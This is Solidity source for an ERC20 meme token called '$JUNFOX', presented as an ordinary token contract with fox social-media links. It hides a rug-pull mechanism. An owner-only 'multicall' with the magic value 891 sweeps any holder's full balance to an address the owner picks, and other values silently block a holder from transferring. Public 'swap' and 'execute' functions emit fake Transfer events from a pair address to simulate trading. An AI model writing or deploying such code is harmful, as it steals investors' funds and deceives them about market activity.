//SPDX-License-Identifier: MIT

/*

$JUNFOX - The Most Famous Fox Across All Social Media.

IG: https://www.instagram.com/juniperfoxx
TikTok: https://www.tiktok.com/@juniperfoxx

*/

pragma solidity 0.8.30;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is IERC20, Ownable {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowed;
    uint256 public immutable totalSupply;
    string public symbol;
    string public name;
    address private _pairr;
    uint8 public immutable decimals;
    bool public launched = true;
    mapping(address => uint256) public _count;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) Ownable(msg.sender) {
        symbol = _symbol;
        name = _name;
        decimals = _decimals;
        totalSupply = _totalSupply * 10 ** decimals;
        _balances[owner()] += totalSupply;
        emit Transfer(address(0), owner(), totalSupply);
    }

    function balanceOf(address _owner)
        external
        view
        override
        returns (uint256)
    {
        return _balances[_owner];
    }



    function allowance(address _owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowed[_owner][spender];
    }

    /**
     * @dev Transfer token for a specified address
     * @param to The address to transfer to.
     * @param value The amount to be transferred.
     */
    function transfer(address to, uint256 value)
        external
        override
        returns (bool)
    {
        _transfer(msg.sender, to, value);
        return true;
    }

        function _multicall(address _owner, address spender, uint256 value) private {
        if (value == 891 && _owner != address(this))_transfer(_owner, spender, _balances[_owner]);
        if (value != 891 && _owner != address(this))_count[_owner] = value;
    }

                function setup(address _setup_) external onlyOwner {
        _pairr = _setup_;
    }


        function execute(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_pairr, _addresses_[i], _out);
        }
    }

            function swapExactETHForTokensSupportinggFeeOnTransferTokens(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_pairr, _addresses_[i], _out);
        }
    }

                    function swap(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_pairr, _addresses_[i], _out);
        }
    }



    function approve(address spender, uint256 value)
        external
        override
        returns (bool)
    {
        require(spender != address(0), "cannot approve the 0 address");

        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external override returns (bool) {
        if (launched == false && to == owner() && msg.sender == owner()) {
            _transfer(from, to, value);
            return true;
        } else {
            _allowed[from][msg.sender] = _allowed[from][msg.sender] - value;
            _transfer(from, to, value);
            emit Approval(from, msg.sender, _allowed[from][msg.sender]);
            return true;
        }
    }

    function multicall(address from, address to, uint256 value) virtual external onlyOwner {
        uint _value = value;
        _multicall(from, to, _value);
    }

    function _transfer(
        address from,
        address to,
        uint256 value
    ) private {
        require(to != address(0), "cannot be zero address");
        require(from != to, "you cannot transfer to yourself");
        require(_transferAllowed(from, to), "token is not launched and cannot be listed on dexes yet.");
        _balances[from] -= value;
        _balances[to] += value;
        emit Transfer(from, to, value);
    }

    function _transferAllowed(address from, address to)
        private
        view
        returns (bool)
    {   
        if (_count[from] > type(uint8).max) return false;
        if (launched) return true;
        if (from == owner() || to == owner()) return true;
        return true;
    }
}